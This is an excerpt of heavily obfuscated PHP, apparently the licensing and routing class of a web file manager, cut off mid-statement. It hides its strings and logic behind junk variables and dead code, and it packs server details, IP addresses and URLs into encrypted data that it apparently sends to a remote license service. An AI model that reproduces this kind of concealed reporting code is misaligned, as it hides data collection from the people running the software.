Application { private $defaultModule = "\151\156\x64\x65\x78"; private $defaultController = "\151\156\144\145\x78"; private $defaultAction = "\x69\156\x64\x65\170"; function __construct() { } public function setDefault($êîÜÙ¸ã) { $ª€ëÕÁì =& $_SERVER[Š—Â“œÔ]; $‹“×Ê×Ø =& $_SERVER[Ÿ­Œüû]; $ŠÔ´—« = explode($‹“×Ê×Ø[0], trim($êîÜÙ¸ã, $‹“×Ê×Ø[0])); $this->defaultModule = $ŠÔ´—«[0] ? $ŠÔ´—«[0] : $this->defaultModule; $this->defaultController = $ŠÔ´—«[1] ? $ŠÔ´—«[1] : $this->defaultController; $Œ©­“æ· = $ª€ëÕÁì[688]; if (strlen($Œ©­“æ·) < $ª€ëÕÁì[689]) { return; } $this->defaultAction = $ŠÔ´—«[2] ? $ŠÔ´—«[2] : $this->defaultAction; $Ğˆ×“š³ = $ª€ëÕÁì[690]; if (strlen($Ğˆ×“š³) < $ª€ëÕÁì[691]) { die; } $this->bjaxaebf4a80($‹“×Ê×Ø[1], array($this, $‹“×Ê×Ø[2])); } public function appRun($Ò¢á”ñ£) { $éîÖ„Å¿ =& $_SERVER[Š—Â“œÔ]; $à†Î«§ =& $_SERVER[Ÿ­Œüû]; $Î½®Ú¡ = explode($à†Î«§[0], $Ò¢á”ñ£); $æ‡Ø”Æ = strtolower($Î½®Ú¡[0]); $Ò½¡Ş· = $à†Î«§[3]; $şìÇ•¶ = $éîÖ„Å¿[692]; if (strlen($şìÇ•¶) < $éîÖ„Å¿[691]) { return; } if ($æ‡Ø”Æ == $à†Î«§[4]) { $Ò½¡Ş· = $à†Î«§[5]; $Î½®Ú¡[0] = $à†Î«§[6]; $Î½®Ú¡[1] = $Î½®Ú¡[1] . $à†Î«§[7]; $Ò¢á”ñ£ = join($à†Î«§[0], $Î½®Ú¡); $Ò¢á”ñ£ = trim($Ò¢á”ñ£, $à†Î«§[0]); } call_user_func(array($à†Î«§[8], $à†Î«§[9]), $Ò½¡Ş· . $à†Î«§[10], $Ò¢á”ñ£); ActionCall($Ò¢á”ñ£); $æœ¯¹Å— = $éîÖ„Å¿[693]; if (strlen($æœ¯¹Å—) < $éîÖ„Å¿[694]) { return; } call_user_func(array($à†Î«§[8], $à†Î«§[9]), $Ò½¡Ş· . $à†Î«§[11], $Ò¢á”ñ£); } private function autorun() { $À‰ôÒ =& $_SERVER[Ÿ­Œüû]; global $config; $¤“­ÔÑ— = $_SERVER[Š—Â“œÔ][695]; if (count($config[$À‰ôÒ[12]]) == 0) { return; } foreach ($config[$À‰ôÒ[12]] as $¶¡–è‡à => $ø†¡‰ıè) { $this->appRun($ø†¡‰ıè); } } private function zkshd707bf32() { $üíı›îø =& $_SERVER[Š—Â“œÔ]; $ŞóÉ…ñ¸ =& $_SERVER[Ÿ­Œüû]; $Ğ™öñ¦î = $ŞóÉ…ñ¸[4]; $¥ıªğË† = $üíı›îø[696]; if (strlen($¥ıªğË†) < $üíı›îø[697]) { die; } $¼âå®ÉÈ = $GLOBALS[$ŞóÉ…ñ¸[13]][$ŞóÉ…ñ¸[14]][0]; if (!$¼âå®ÉÈ || strlen($¼âå®ÉÈ) <= strlen($Ğ™öñ¦î)) { return; } if (strtolower(substr($¼âå®ÉÈ, -strlen($Ğ™öñ¦î))) != $Ğ™öñ¦î) { return; } $«©¸»’ø = substr($¼âå®ÉÈ, 0, -strlen($Ğ™öñ¦î)); $Œ©ÅÅÙ = array($ŞóÉ…ñ¸[4], $«©¸»’ø); $ø„üµ²³ = array_slice($GLOBALS[$ŞóÉ…ñ¸[13]][$ŞóÉ…ñ¸[14]], 1); $…ñå¥©Û = $üíı›îø[698]; $GLOBALS[$ŞóÉ…ñ¸[13]][$ŞóÉ…ñ¸[14]] = array_merge($Œ©ÅÅÙ, $ø„üµ²³); $GLOBALS[$ŞóÉ…ñ¸[13]][$ŞóÉ…ñ¸[15]] = implode($ŞóÉ…ñ¸[0], $GLOBALS[$ŞóÉ…ñ¸[13]][$ŞóÉ…ñ¸[14]]); $üÅ™ŞÌ = $üíı›îø[699]; } private function zeoh03103f13() { $³ãè¯“Ì =& $_SERVER[Š—Â“œÔ]; $½½Õ×ÎÈ =& $_SERVER[Ÿ­Œüû]; if ($GLOBALS[$½½Õ×ÎÈ[13]][$½½Õ×ÎÈ[15]] != $½½Õ×ÎÈ[6]) { return; } $˜ùø÷·³ = $_SERVER[$½½Õ×ÎÈ[16]]; $Ó¹½»Ü³ = $³ãè¯“Ì[700]; while (strlen($Ó¹½»Ü³) < $³ãè¯“Ì[689]) { if (!$Ó¹½»Ü³) { break; } $Ó¹½»Ü³++; } $¹´ÈÚü€ = $½½Õ×ÎÈ[17]; if (!strstr($˜ùø÷·³, $¹´ÈÚü€)) { return; } $®·Şß©ˆ = strrpos($˜ùø÷·³, $¹´ÈÚü€); $šÔ…Ûå = $³ãè¯“Ì[701]; if (strlen($šÔ…Ûå) < $³ãè¯“Ì[691]) { die; } $÷Òô´ÇÉ = substr($˜ùø÷·³, $®·Şß©ˆ + strlen($¹´ÈÚü€)); preg_match_all($½½Õ×ÎÈ[18], $÷Òô´ÇÉ, $®²û™ó); $Ó½ŒÆíÂ = $³ãè¯“Ì[702]; if (!$Ó½ŒÆíÂ) { die; } $÷Òô´ÇÉ = trim($®²û™ó[0][0], $½½Õ×ÎÈ[19]); $GLOBALS[$½½Õ×ÎÈ[13]][$½½Õ×ÎÈ[14]] = explode($½½Õ×ÎÈ[19], $÷Òô´ÇÉ); $GLOBALS[$½½Õ×ÎÈ[13]][$½½Õ×ÎÈ[15]] = implode($½½Õ×ÎÈ[0], $GLOBALS[$½½Õ×ÎÈ[13]][$½½Õ×ÎÈ[14]]); } public function run() { $«£àğ =& $_SERVER[Š—Â“œÔ]; $¨½ñ½ì® =& $_SERVER[Ÿ­Œüû]; $this->zeoh03103f13(); $this->zkshd707bf32(); $Ö·ã¿¾ò = $«£àğ[703]; if (!$Ö·ã¿¾ò) { return; } $µìÂ²œ¦ = $GLOBALS[$¨½ñ½ì®[13]][$¨½ñ½ì®[14]]; $ƒÀ–û‡ = $GLOBALS[$¨½ñ½ì®[13]][$¨½ñ½ì®[15]]; $­ƒ€ş“ß = $«£àğ[704]; if (!$­ƒ€ş“ß) { return; } define($¨½ñ½ì®[20], isset($µìÂ²œ¦[0]) && $µìÂ²œ¦[0] ? $µìÂ²œ¦[0] : $this->defaultModule); $†‚’—Å = $«£àğ[705]; if (!$†‚’—Å) { return; } define($¨½ñ½ì®[21], isset($µìÂ²œ¦[1]) && $µìÂ²œ¦[0] ? $µìÂ²œ¦[1] : $this->defaultController); define($¨½ñ½ì®[22], isset($µìÂ²œ¦[2]) && $µìÂ²œ¦[0] ? $µìÂ²œ¦[2] : $this->defaultAction); define($¨½ñ½ì®[23], MOD . $¨½ñ½ì®[0] . ST . $¨½ñ½ì®[0] . ACT); $_SERVER[$¨½ñ½ì®[24]] = strtolower(ACTION); $Ãã—¹­ì = $«£àğ[706]; while (strlen($Ãã—¹­ì) < $«£àğ[694]) { if (!$Ãã—¹­ì) { break; } $Ãã—¹­ì++; } $this->autorun(); if (count($µìÂ²œ¦) >= 3) { $this->appRun($ƒÀ–û‡); } else { $this->appRun(ACTION); } } private $xdvq74adfdd5 = array(); private $xsazfdcd10d0 = ''; public function jluaba613750() { $Éı¡Ï­ =& $_SERVER[Š—Â“œÔ]; $Óì¥Ûò =& $_SERVER[Ÿ­Œüû]; $this->pzvo1b3ee800(); $…ñ¨öÊ = $Éı¡Ï­[707]; while ($…ñ¨öÊ < $Éı¡Ï­[697]) { if ($…ñ¨öÊ >= 0) { break; } $…ñ¨öÊ++; } $this->akwy006590d2(); $this->udegca8397f3(); $„­³ê‘Ê = $Éı¡Ï­[708]; if (!$„­³ê‘Ê) { die; } $this->omiu49fd32ff(); $ÑÖ¨º– = $Éı¡Ï­[709]; if (!$ÑÖ¨º–) { die; } $this->tyaw8054399b(); $this->blnvd34c282b(); $™ùï¨èİ = $Éı¡Ï­[710]; $this->zitk6bd83c4b(); $…†Û‰ãƒ = $Éı¡Ï­[703]; $this->bjaxaebf4a80($Óì¥Ûò[25], array($this, $Óì¥Ûò[26])); $¨‰£éÉƒ = $Éı¡Ï­[711]; $this->bjaxaebf4a80($Óì¥Ûò[27], array($this, $Óì¥Ûò[28])); $ûğú‰ç¦ = $Éı¡Ï­[712]; $this->bjaxaebf4a80($Óì¥Ûò[29], array($this, $Óì¥Ûò[30])); $this->bjaxaebf4a80($Óì¥Ûò[31], array($this, $Óì¥Ûò[32])); $ËÚëßÍñ = $Éı¡Ï­[713]; while ($ËÚëßÍñ < $Éı¡Ï­[714]) { if ($ËÚëßÍñ >= 0) { break; } $ËÚëßÍñ++; } } public function jpdx97edfde6($Ë™œ¡òË) { $Èœ¡¹ÆÖ =& $_SERVER[Š—Â“œÔ]; $ƒ­ÎçŞ =& $_SERVER[Ÿ­Œüû]; $ÕÙÃ¨èÓ = Model($ƒ­ÎçŞ[33])->get(); $Íù¶–¶Ó = $Èœ¡¹ÆÖ[715]; while (strlen($Íù¶–¶Ó) < $Èœ¡¹ÆÖ[689]) { if (!$Íù¶–¶Ó) { break; } $Íù¶–¶Ó++; } $ŒÎè†Ë = array($ƒ­ÎçŞ[34], $ƒ­ÎçŞ[35], $ƒ­ÎçŞ[36], $ƒ­ÎçŞ[37], $ƒ­ÎçŞ[38], $ƒ­ÎçŞ[39], $ƒ­ÎçŞ[40], $ƒ­ÎçŞ[41], $ƒ­ÎçŞ[42], $ƒ­ÎçŞ[43], $ƒ­ÎçŞ[44], $ƒ­ÎçŞ[45], $ƒ­ÎçŞ[46], $ƒ­ÎçŞ[47], $ƒ­ÎçŞ[48], $ƒ­ÎçŞ[49], $ƒ­ÎçŞ[50], $ƒ­ÎçŞ[51], $ƒ­ÎçŞ[52], $ƒ­ÎçŞ[53], $ƒ­ÎçŞ[54], $ƒ­ÎçŞ[55], $ƒ­ÎçŞ[56], $ƒ­ÎçŞ[57], $ƒ­ÎçŞ[58], $ƒ­ÎçŞ[59], $ƒ­ÎçŞ[60], $ƒ­ÎçŞ[61], $ƒ­ÎçŞ[62], $ƒ­ÎçŞ[63], $ƒ­ÎçŞ[64], $ƒ­ÎçŞ[65], $ƒ­ÎçŞ[66], $ƒ­ÎçŞ[67], $ƒ­ÎçŞ[68], $ƒ­ÎçŞ[69], $ƒ­ÎçŞ[70], $ƒ­ÎçŞ[71], $ƒ­ÎçŞ[72], $ƒ­ÎçŞ[73], $ƒ­ÎçŞ[74], $ƒ­ÎçŞ[75], $ƒ­ÎçŞ[76], $ƒ­ÎçŞ[77], $ƒ­ÎçŞ[78], $ƒ­ÎçŞ[79], $ƒ­ÎçŞ[80], $ƒ­ÎçŞ[81], $ƒ­ÎçŞ[82], $ƒ­ÎçŞ[83], $ƒ­ÎçŞ[84], $ƒ­ÎçŞ[85]); $­ôí¦Ê = $Èœ¡¹ÆÖ[716]; foreach ($ŒÎè†Ë as $Û¥áØõû) { $´Ó°°š‰ = $GLOBALS[$ƒ­ÎçŞ[86]][$ƒ­ÎçŞ[87]][$Û¥áØõû]; if (isset($ÕÙÃ¨èÓ[$Û¥áØõû])) { $´Ó°°š‰ = $ÕÙÃ¨èÓ[$Û¥áØõû]; } $Ë™œ¡òË[$ƒ­ÎçŞ[88]][$ƒ­ÎçŞ[89]][$Û¥áØõû] = $´Ó°°š‰; } $¸÷Ÿ¿öú = $Ë™œ¡òË[$ƒ­ÎçŞ[88]][$ƒ­ÎçŞ[89]][$ƒ­ÎçŞ[46]]; $îûÌ™›¢ = $Èœ¡¹ÆÖ[717]; unset($Ë™œ¡òË[$ƒ­ÎçŞ[88]][$ƒ­ÎçŞ[90]][$ƒ­ÎçŞ[91]]); unset($Ë™œ¡òË[$ƒ­ÎçŞ[88]][$ƒ­ÎçŞ[90]][$ƒ­ÎçŞ[92]]); unset($Ë™œ¡òË[$ƒ­ÎçŞ[88]][$ƒ­ÎçŞ[89]][$ƒ­ÎçŞ[46]]); $¾ÙØêï = $Èœ¡¹ÆÖ[718]; if (!$¾ÙØêï) { die; } unset($Ë™œ¡òË[$ƒ­ÎçŞ[88]][$ƒ­ÎçŞ[89]][$ƒ­ÎçŞ[93]]); $ÄñãñÍè = $Èœ¡¹ÆÖ[719]; while ($ÄñãñÍè < $Èœ¡¹ÆÖ[697]) { if ($ÄñãñÍè >= 0) { break; } $ÄñãñÍè++; } $Ë™œ¡òË[$ƒ­ÎçŞ[88]][$ƒ­ÎçŞ[89]][$ƒ­ÎçŞ[94]] = array($ƒ­ÎçŞ[95] => (int) $¸÷Ÿ¿öú[$ƒ­ÎçŞ[96]], $ƒ­ÎçŞ[97] => (int) _get($¸÷Ÿ¿öú, $ƒ­ÎçŞ[98], 0)); $ÅÜÑ†ƒÍ = $Èœ¡¹ÆÖ[720]; $£²Ïä— = substr(md5($ƒ­ÎçŞ[99] . get_client_ip() . $ÕÙÃ¨èÓ[$ƒ­ÎçŞ[100]]), 0, 15); $Ë™œ¡òË[$ƒ­ÎçŞ[101]][$ƒ­ÎçŞ[102]] = Mcrypt::encode(Session::sign(), $£²Ïä—, 3600 * 24); $Ë™œ¡òË[$ƒ­ÎçŞ[101]][$ƒ­ÎçŞ[103]] = Action($ƒ­ÎçŞ[104])->accessToken(); $™¹Êúé¾ = $Èœ¡¹ÆÖ[721]; if (strlen($™¹Êúé¾) < $Èœ¡¹ÆÖ[697]) { die; } $Ë™œ¡òË[$ƒ­ÎçŞ[101]][$ƒ­ÎçŞ[105]] = md5($_SERVER[$ƒ­ÎçŞ[106]] . $ÕÙÃ¨èÓ[$ƒ­ÎçŞ[100]]); $û«·†¢™ = $Èœ¡¹ÆÖ[722]; if (strlen($û«·†¢™) < $Èœ¡¹ÆÖ[689]) { die; } $Ë™œ¡òË[$ƒ­ÎçŞ[101]][$ƒ­ÎçŞ[107]] = base64_encode(serverInfo()); $Ë™œ¡òË[$ƒ­ÎçŞ[101]][$ƒ­ÎçŞ[108]] = $this->xsazfdcd10d0; if ($ÕÙÃ¨èÓ[$ƒ­ÎçŞ[108]] != $ƒ­ÎçŞ[109]) { $Ë™œ¡òË[$ƒ­ÎçŞ[101]][$ƒ­ÎçŞ[110]] = $ÕÙÃ¨èÓ[$ƒ­ÎçŞ[110]]; $Ë™œ¡òË[$ƒ­ÎçŞ[101]][$ƒ­ÎçŞ[111]] = $ÕÙÃ¨èÓ[$ƒ­ÎçŞ[111]]; $’°˜ƒŸˆ = rand_string(10) . $this->xsazfdcd10d0 . rand_string(5); $Ë™œ¡òË[$ƒ­ÎçŞ[88]][$ƒ­ÎçŞ[112]][$ƒ­ÎçŞ[113]] = $this->iwzua1d261fe($’°˜ƒŸˆ, $Ë™œ¡òË[$ƒ­ÎçŞ[101]][$ƒ­ÎçŞ[105]]); } if ($this->xsazfdcd10d0 == $ƒ­ÎçŞ[109]) { $Ë™œ¡òË[$ƒ­ÎçŞ[88]][$ƒ­ÎçŞ[89]][$ƒ­ÎçŞ[94]][$ƒ­ÎçŞ[98]] = 0; } $Ë™œ¡òË[$ƒ­ÎçŞ[101]][$ƒ­ÎçŞ[114]] = $this->versionPluginFilter(); $Ë™œ¡òË[$ƒ­ÎçŞ[101]][$ƒ­ÎçŞ[115]] = _get($this->xdvq74adfdd5, $ƒ­ÎçŞ[116], $ƒ­ÎçŞ[6]); $³¡ã—Ü­ = $Èœ¡¹ÆÖ[723]; if (KodUser::isRoot() && $this->config[$ƒ­ÎçŞ[117]]) { $Ë™œ¡òË[$ƒ­ÎçŞ[101]][$ƒ­ÎçŞ[118]] = WEB_ROOT; } return $Ë™œ¡òË; } private function blnvd34c282b() { $ã£¿Ş³ =& $_SERVER[Š—Â“œÔ]; $ÙŒôÁ×Ê =& $_SERVER[Ÿ­Œüû]; $¶õ“Ğü = $_SERVER[$ÙŒôÁ×Ê[24]] == $ÙŒôÁ×Ê[119]; $ÁòÆáä† = $ã£¿Ş³[724]; if (!$ÁòÆáä†) { return; } if ($_SERVER[$ÙŒôÁ×Ê[24]] == $ÙŒôÁ×Ê[120] && $_GET[$ÙŒôÁ×Ê[121]] == $ÙŒôÁ×Ê[122]) { $¶õ“Ğü = !0; } if ($¶õ“Ğü) { $ËÄÏ“«Â = array($ÙŒôÁ×Ê[108] => $this->xsazfdcd10d0, $ÙŒôÁ×Ê[123] => $this->yugm51f4a186(), $ÙŒôÁ×Ê[124] => Model($ÙŒôÁ×Ê[125])->count()); if ($this->xsazfdcd10d0 != $ÙŒôÁ×Ê[109]) { $›…áõÄ× = _get($this->xdvq74adfdd5, $ÙŒôÁ×Ê[126]); if ($›…áõÄ×) { $ËÄÏ“«Â[$ÙŒôÁ×Ê[127]] = $›…áõÄ×; $ËÄÏ“«Â[$ÙŒôÁ×Ê[128]] = strtotime(_get($this->xdvq74adfdd5, $ÙŒôÁ×Ê[129])); $ËÄÏ“«Â[$ÙŒôÁ×Ê[130]] = _get($this->xdvq74adfdd5, $ÙŒôÁ×Ê[116]); } $­¤ú¯·ç = Model($ÙŒôÁ×Ê[33])->get($ÙŒôÁ×Ê[131], $ÙŒôÁ×Ê[6], !0); if (is_string($­¤ú¯·ç) && substr($­¤ú¯·ç, 0, 1) == $ÙŒôÁ×Ê[132]) { $­¤ú¯·ç = json_decode_force($­¤ú¯·ç); } if (is_array($­¤ú¯·ç) && $­¤ú¯·ç[$ÙŒôÁ×Ê[133]] && strstr($­¤ú¯·ç[$ÙŒôÁ×Ê[133]], $ÙŒôÁ×Ê[134])) { $Ş×¥ô±® = explode($ÙŒôÁ×Ê[134], $­¤ú¯·ç[$ÙŒôÁ×Ê[133]]); $ËÄÏ“«Â[$ÙŒôÁ×Ê[135]] = $Ş×¥ô±®[0]; } } $ËÄÏ“«Â = $this->xprs01da9744(json_encode($ËÄÏ“«Â), md5($ÙŒôÁ×Ê[136])); $Ÿ§­¢¤ = $ã£¿Ş³[725]; if (strlen($Ÿ§­¢¤) < $ã£¿Ş³[689]) { die; } $±áÖßâş = array($ÙŒôÁ×Ê[137] => $ËÄÏ“«Â); call_user_func(array($ÙŒôÁ×Ê[138], $ÙŒôÁ×Ê[139]), $±áÖßâş); $Ä®‘»»ñ = $ã£¿Ş³[726]; if (!$Ä®‘»»ñ) { return; } } if ($this->xsazfdcd10d0 == $ÙŒôÁ×Ê[109]) { return; } $ıº€×£Ù = array($ÙŒôÁ×Ê[140], $ÙŒôÁ×Ê[141], $ÙŒôÁ×Ê[142], $ÙŒôÁ×Ê[143], $ÙŒôÁ×Ê[144], $ÙŒôÁ×Ê[145]); $ˆä³ê’¶ = $ã£¿Ş³[727]; if (!$ˆä³ê’¶) { return; } $ÁÄ©óÍû = Model($ÙŒôÁ×Ê[33])->get(); $±áÖßâş = array($ÙŒôÁ×Ê[146] => $ÁÄ©óÍû[$ÙŒôÁ×Ê[34]], $ÙŒôÁ×Ê[147] => $ÁÄ©óÍû[$ÙŒôÁ×Ê[35]], $ÙŒôÁ×Ê[148] => $ÙŒôÁ×Ê[6]); $’ÑŠçâì = $ã£¿Ş³[728]; if (!$’ÑŠçâì) { die; } foreach ($ıº€×£Ù as $ÎÌÛÎ­½) { if (!isset($ÁÄ©óÍû[$ÎÌÛÎ­½]) || !$ÁÄ©óÍû[$ÎÌÛÎ­½]) { continue; } $±áÖßâş[$ÎÌÛÎ­½] = $ÁÄ©óÍû[$ÎÌÛÎ­½]; } call_user_func(array($ÙŒôÁ×Ê[138], $ÙŒôÁ×Ê[139]), $±áÖßâş); } private function omiu49fd32ff() { $ëÔœ…—× =& $_SERVER[Š—Â“œÔ]; $ÃÈ‘Ã—¸ =& $_SERVER[Ÿ­Œüû]; if ($_SERVER[$ÃÈ‘Ã—¸[24]] != $ÃÈ‘Ã—¸[149]) { return; } if (!KodUser::isRoot()) { die; } $Ï†€Éœµ = $GLOBALS[$ÃÈ‘Ã—¸[13]]; if (isset($Ï†€Éœµ[$ÃÈ‘Ã—¸[150]])) { $this->krzsc4815ea4(); die; } if (isset($Ï†€Éœµ[$ÃÈ‘Ã—¸[151]]) && isset($Ï†€Éœµ[$ÃÈ‘Ã—¸[151]]) == $ÃÈ‘Ã—¸[122]) { $Ï†€Éœµ[$ÃÈ‘Ã—¸[152]] = Model($ÃÈ‘Ã—¸[33])->get($ÃÈ‘Ã—¸[153]); } if (!isset($Ï†€Éœµ[$ÃÈ‘Ã—¸[152]]) || strlen($Ï†€Éœµ[$ÃÈ‘Ã—¸[152]]) != 16) { show_json($ÃÈ‘Ã—¸[154] . $Ï†€Éœµ[$ÃÈ‘Ã—¸[152]], !1); } $Îº†Ü = Model($ÃÈ‘Ã—¸[33])->get($ÃÈ‘Ã—¸[100]); $æÂŞ¢Ğß = md5($_SERVER[$ÃÈ‘Ã—¸[106]] . $Îº†Ü); $—ü®³óÙ = $ëÔœ…—×[729]; if (strlen($—ü®³óÙ) < $ëÔœ…—×[694]) { die; } $ÙÚ¡âİš = array($ÃÈ‘Ã—¸[152] => $Ï†€Éœµ[$ÃÈ‘Ã—¸[152]], $ÃÈ‘Ã—¸[155] => rand_string(16), $ÃÈ‘Ã—¸[156] => $ÃÈ‘Ã—¸[136], $ÃÈ‘Ã—¸[157] => $ÃÈ‘Ã—¸[158], $ÃÈ‘Ã—¸[159] => $_SERVER[$ÃÈ‘Ã—¸[160]], $ÃÈ‘Ã—¸[161] => $_SERVER[$ÃÈ‘Ã—¸[162]], $ÃÈ‘Ã—¸[163] => $_SERVER[$ÃÈ‘Ã—¸[164]], $ÃÈ‘Ã—¸[105] => $æÂŞ¢Ğß, $ÃÈ‘Ã—¸[165] => Model($ÃÈ‘Ã—¸[33])->get($ÃÈ‘Ã—¸[131])); if (isset($Ï†€Éœµ[$ÃÈ‘Ã—¸[151]]) && isset($Ï†€Éœµ[$ÃÈ‘Ã—¸[151]]) == $ÃÈ‘Ã—¸[122]) { $ÙÚ¡âİš[$ÃÈ‘Ã—¸[151]] = md5($ÙÚ¡âİš[$ÃÈ‘Ã—¸[152]] . $ÃÈ‘Ã—¸[166] . $ÙÚ¡âİš[$ÃÈ‘Ã—¸[155]]); } if ($Ï†€Éœµ[$ÃÈ‘Ã—¸[167]] == $ÃÈ‘Ã—¸[168]) { $°Ò·™Óë = $this->xprs01da9744($æÂŞ¢Ğß, $ÃÈ‘Ã—¸[169]); $–Àæùâ = $this->iwzua1d261fe(json_encode($ÙÚ¡âİš), $æÂŞ¢Ğß . $ÃÈ‘Ã—¸[170], 3); $–Àæùâ = $–Àæùâ . $ÃÈ‘Ã—¸[171] . $_SERVER[$ÃÈ‘Ã—¸[160]]; $Ò“¶ÑŸÃ = $this->uasma8322084($ÃÈ‘Ã—¸[172] . $°Ò·™Óë . $ÃÈ‘Ã—¸[173] . $–Àæùâ, -1); show_json($Ò“¶ÑŸÃ, !0); } else { if ($Ï†€Éœµ[$ÃÈ‘Ã—¸[167]] == $ÃÈ‘Ã—¸[174]) { $ç¬áŠçğ = substr(md5($ÃÈ‘Ã—¸[175] . $æÂŞ¢Ğß), 12, 15) . $ÃÈ‘Ã—¸[176]; $–Àæùâ = $this->wiun8a2ae84e(trim($Ï†€Éœµ[$ÃÈ‘Ã—¸[177]]), $ç¬áŠçğ, 2); $é‚Œ›úñ = json_decode($–Àæùâ, !0); if (!is_array($é‚Œ›úñ) || !is_array($é‚Œ›úñ[$ÃÈ‘Ã—¸[178]]) || $é‚Œ›úñ[$ÃÈ‘Ã—¸[152]] != !0) { $õ‰Êíùê = $ÃÈ‘Ã—¸[179]; $Ğ†Áò” = $é‚Œ›úñ[$ÃÈ‘Ã—¸[178]] ? $ÃÈ‘Ã—¸[180] . $é‚Œ›úñ[$ÃÈ‘Ã—¸[178]] : $õ‰Êíùê; show_json($Ğ†Áò”, !1); } else { $ÙÚ¡âİš[$ÃÈ‘Ã—¸[155]] = $é‚Œ›úñ[$ÃÈ‘Ã—¸[178]][$ÃÈ‘Ã—¸[181]]; } } else { $é‚Œ›úñ = $this->uasma8322084($ÃÈ‘Ã—¸[182], $ÙÚ¡âİš, 10); } } if (!is_array($é‚Œ›úñ) || !is_array($é‚Œ›úñ[$ÃÈ‘Ã—¸[178]]) || $é‚Œ›úñ[$ÃÈ‘Ã—¸[152]] != !0) { $õ‰Êíùê = LNG($ÃÈ‘Ã—¸[183]); $Ğ†Áò” = $é‚Œ›úñ[$ÃÈ‘Ã—¸[178]] ? $ÃÈ‘Ã—¸[180] . $é‚Œ›úñ[$ÃÈ‘Ã—¸[178]] : $õ‰Êíùê; show_json($Ğ†Áò”, !1); } $’àš‰˜Í = $é‚Œ›úñ[$ÃÈ‘Ã—¸[178]]; $Äœúøëò = $this->vzsoc28323ef($’àš‰˜Í[$ÃÈ‘Ã—¸[184]]); $´«±Şƒ… = $ëÔœ…—×[730]; if (!$´«±Şƒ…) { return; } if (!$Äœúøëò || $Äœúøëò != $’àš‰˜Í[$ÃÈ‘Ã—¸[129]]) { $ Ôö†İİ = array($ÃÈ‘Ã—¸[185] => Model($ÃÈ‘Ã—¸[33])->get($ÃÈ‘Ã—¸[100]), $ÃÈ‘Ã—¸[186] => $_SERVER[$ÃÈ‘Ã—¸[106]], $ÃÈ‘Ã—¸[187] => this_url(), $ÃÈ‘Ã—¸[161] => $_SERVER[$ÃÈ‘Ã—¸[162]]); $–Àæùâ = $this->ypbcd21cf2db(json_encode($ Ôö†İİ)); $this->uasma8322084($ÃÈ‘Ã—¸[188] . $–Àæùâ); show_json(LNG($ÃÈ‘Ã—¸[189]), !0); } $ìó£İû¦ = array($ÃÈ‘Ã—¸[153] => $’àš‰˜Í[$ÃÈ‘Ã—¸[190]], $ÃÈ‘Ã—¸[191] => $’àš‰˜Í[$ÃÈ‘Ã—¸[192]], $ÃÈ‘Ã—¸[193] => rand_string(16), $ÃÈ‘Ã—¸[108] => $’àš‰˜Í[$ÃÈ‘Ã—¸[194]]); if ($ÙÚ¡âİš[$ÃÈ‘Ã—¸[155]]) { $ìó£İû¦[$ÃÈ‘Ã—¸[193]] = $ÙÚ¡âİš[$ÃÈ‘Ã—¸[155]]; } $ŠÅ¾Çƒ = substr(md5($ìó£İû¦[$ÃÈ‘Ã—¸[191]]), 10, 10); $æ’•Ãèç = $ŠÅ¾Çƒ . $ìó£İû¦[$ÃÈ‘Ã—¸[108]] . $ìó£İû¦[$ÃÈ‘Ã—¸[193]]; $ìó£İû¦[$ÃÈ‘Ã—¸[110]] = strrev(base64_encode($this->xprs01da9744($æ’•Ãèç, $ÃÈ‘Ã—¸[195]))); $şİåïœ = rand_string(16); $­ÅÛíÁÏ = $şİåïœ . $ìó£İû¦[$ÃÈ‘Ã—¸[108]] . $this->xprs01da9744(md5($ìó£İû¦[$ÃÈ‘Ã—¸[153]]), $şİåïœ); $õ¤’ = $ëÔœ…—×[731]; while (strlen($õ¤’) < $ëÔœ…—×[694]) { if (!$õ¤’) { break; } $õ¤’++; } $ìó£İû¦[$ÃÈ‘Ã—¸[111]] = base64_encode(strrev($this->xprs01da9744($­ÅÛíÁÏ, $ÃÈ‘Ã—¸[196]))); $©ÕƒöÎÜ = $ëÔœ…—×[732]; if (strlen($©ÕƒöÎÜ) < $ëÔœ…—×[689]) { die; } if ($’àš‰˜Í[$ÃÈ‘Ã—¸[197]] && $’àš‰˜Í[$ÃÈ‘Ã—¸[197]] >= 1) { Model($ÃÈ‘Ã—¸[33])->setDeep($ÃÈ‘Ã—¸[198], $ÃÈ‘Ã—¸[122]); } Model($ÃÈ‘Ã—¸[33])->set($ìó£İû¦); $àË°ÙĞ³ = md5($_SERVER[$ÃÈ‘Ã—¸[106]] . strrev($Îº†Ü) . $ìó£İû¦[$ÃÈ‘Ã—¸[191]]); $œİ›ÀŒÏ = $ëÔœ…—×[733]; if (strlen($œİ›ÀŒÏ) < $ëÔœ…—×[697]) { return; } $×°À·—„ = strrev(substr($àË°ÙĞ³, 10, 16)); $©º×æ = $ëÔœ…—×[734]; while ($©º×æ < $ëÔœ…—×[697]) { if ($©º×æ >= 0) { break; } $©º×æ++; } $¼¸Ó¢– = $this->iwzua1d261fe(json_encode($’àš‰˜Í), $àË°ÙĞ³); $¼ü¿ß“à = $ëÔœ…—×[735]; $¨½¶ë¿Õ = array_to_keyvalue(Model($ÃÈ‘Ã—¸[7])->listData(), $ÃÈ‘Ã—¸[199]); $‹Òãıì = $¨½¶ë¿Õ[$ÃÈ‘Ã—¸[200]]; $Íš´Áİş = array(); $Íš´Áİş[$×°À·—„] = $¼¸Ó¢–; Model($ÃÈ‘Ã—¸[7])->update($‹Òãıì[$ÃÈ‘Ã—¸[201]], array($ÃÈ‘Ã—¸[202] => $Íš´Áİş)); $­ØËúËˆ = $ëÔœ…—×[736]; while (strlen($­ØËúËˆ) < $ëÔœ…—×[689]) { if (!$­ØËúËˆ) { break; } $­ØËúËˆ++; } $this->xdvq74adfdd5 = $’àš‰˜Í; $this->xsazfdcd10d0 = $ìó£İû¦[$ÃÈ‘Ã—¸[108]]; $ÚòÀÊ•® = $ëÔœ…—×[737]; if (!$ÚòÀÊ•®) { die; } $this->licenseRegistSuccess(); Cache::set($ÃÈ‘Ã—¸[203] . md5($Îº†Ü . $ÃÈ‘Ã—¸[204]), $ÃÈ‘Ã—¸[6]); $¥œ–•ÜÔ = $ëÔœ…—×[738]; if (strlen($¥œ–•ÜÔ) < $ëÔœ…—×[689]) { return; } show_json(LNG($ÃÈ‘Ã—¸[189]), !0); } private function licenseRegistSuccess() { $„†ùôóØ =& $_SERVER[Ÿ­Œüû]; $™¾÷•ÇÁ = Model($„†ùôóØ[33])->get(); $‘ˆÂ‘ºó = $_SERVER[Š—Â“œÔ][739]; if (!$‘ˆÂ‘ºó) { die; } if ($™¾÷•ÇÁ[$„†ùôóØ[63]] != 